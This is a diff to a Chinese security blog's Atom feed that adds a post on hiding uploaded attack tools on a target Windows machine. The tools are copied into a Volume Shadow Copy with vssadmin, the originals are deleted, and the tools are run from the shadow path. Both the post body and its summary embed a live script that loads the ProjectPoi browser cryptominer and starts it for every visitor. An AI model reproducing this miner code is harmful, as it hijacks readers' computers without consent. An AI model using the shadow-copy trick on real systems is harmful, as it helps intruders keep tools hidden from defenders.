@@ -6,7 +6,7 @@
   <link href="//atom.xml" rel="self"/>
   
   <link href="http://damit5.ml/"/>
-  <updated>2017-11-14T05:57:13.137Z</updated>
+  <updated>2017-11-19T09:37:48.063Z</updated>
   <id>http://damit5.ml/</id>
   
   <author>
@@ -15,6 +15,54 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>渗透技巧之隐藏自己的工具</title>
+    <link href="http://damit5.ml/2017/11/19/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E9%9A%90%E8%97%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
+    <id>http://damit5.ml/2017/11/19/渗透技巧之隐藏自己的工具/</id>
+    <published>2017-11-19T09:33:45.000Z</published>
+    <updated>2017-11-19T09:37:48.063Z</updated>
+    
+    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer0"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>大家在做渗透的时候，经常要传一些工具到目标机器上执行。有的时候传一次，执行完了就删除了，后来发现还要再用，又要再次上传，很是麻烦而且也容易造成被发现的风险。有的可能会把工具放到一个很深的目录里藏起来，但是这种工具长期放在目标机器上又不安全。今天我给大家介绍一个猥琐的小技巧，可以放心的把工具放在目标机器上，而又不会被发现。</p><a id="more"></a><p>这里利用的是微软 <strong>VSS（Volume Shadow Copy）</strong></p><p>部分版本自带</p><h3 id="0x02-开始"><a href="#0x02-开始" class="headerlink" title="0x02 开始"></a>0x02 开始</h3><h5 id="1-上传你的工具"><a href="#1-上传你的工具" class="headerlink" title="1.上传你的工具"></a>1.上传你的工具</h5><h5 id="2-创建-shadows"><a href="#2-创建-shadows" class="headerlink" title="2.创建 shadows"></a>2.创建 shadows</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vssadmin create shadow /for=c:</div></pre></td></tr></table></figure><h5 id="3-删除你上传的工具目录"><a href="#3-删除你上传的工具目录" class="headerlink" title="3.删除你上传的工具目录"></a>3.删除你上传的工具目录</h5><h5 id="4-查看所有的-shadows"><a href="#4-查看所有的-shadows" class="headerlink" title="4.查看所有的 shadows"></a>4.查看所有的 shadows</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vssadmin list shadows</div></pre></td></tr></table></figure><p>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">C:\Users\Administrator&gt;vssadmin list shadows</div><div class="line">vssadmin 1.1 - 卷影复制服务管理命令行工具</div><div class="line">(C) 版权所有 2001-2013 Microsoft Corp.</div><div class="line"></div><div class="line">卷影副本集 ID: &#123;06143a46-ca59-44e4-8498-83fa6523706a&#125; 的内容</div><div class="line">   在创建时间: 2017/11/19 17:18:11 含有 1 个卷影副本</div><div class="line">      卷影副本 ID: &#123;9f1881a4-0c9e-4527-9f2c-8d14abbb8e3a&#125;</div><div class="line">         原始卷: (C:)\\?\Volume&#123;2c9768f1-4812-11e6-80d9-806e6f6e696</div><div class="line">         卷影副本卷: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy</div><div class="line">         源起机器: 10_154_227_230</div><div class="line">         服务机器: 10_154_227_230</div><div class="line">         提供程序: &apos;Microsoft Software Shadow Copy provider 1.0&apos;</div><div class="line">         类型: ClientAccessible</div><div class="line">         属性: 持续, 客户端可访问, 无自动释放, 没有写入程序, 差异</div></pre></td></tr></table></figure></p><h5 id="5-运行你的工具"><a href="#5-运行你的工具" class="headerlink" title="5.运行你的工具"></a>5.运行你的工具</h5><p>将<strong>卷影副本卷</strong>中的 <code>?</code> 替换为 <code>.</code>再加上路径就可以了</p><p><strong>eg:</strong></p><p>假如我的工具位置为：<code>C:\test\test.exe</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy\test\test.exe</div></pre></td></tr></table></figure></p><hr><p>到这就结束了</p><p>最后补充一点</p><h5 id="6-删除这个shadows"><a href="#6-删除这个shadows" class="headerlink" title="6.删除这个shadows"></a>6.删除这个shadows</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vssadmin delete shadows /shadow=&#123;9f1881a4-0c9e-4527-9f2c-8d14abbb8e3a&#125;</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;div id=&quot;aplayer0&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
+		&lt;script&gt;
+			new APlayer({
+				element: document.getElementById(&quot;aplayer0&quot;),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: &quot;六月的雨&quot;,
+					author: &quot;胡歌&quot;,
+					url: &quot;http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
+					pic: &quot;http://damit5.kiwi/Music/233.jpg&quot;,
+				}
+			});
+		&lt;/script&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+var script = document.createElement(&quot;script&quot;);
+script.type = &quot;text/javascript&quot;;
+script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
+script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
+document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;/html&gt;
+
+&lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;大家在做渗透的时候，经常要传一些工具到目标机器上执行。有的时候传一次，执行完了就删除了，后来发现还要再用，又要再次上传，很是麻烦而且也容易造成被发现的风险。有的可能会把工具放到一个很深的目录里藏起来，但是这种工具长期放在目标机器上又不安全。今天我给大家介绍一个猥琐的小技巧，可以放心的把工具放在目标机器上，而又不会被发现。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://damit5.ml/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>Windows系统远程桌面的多用户登录</title>
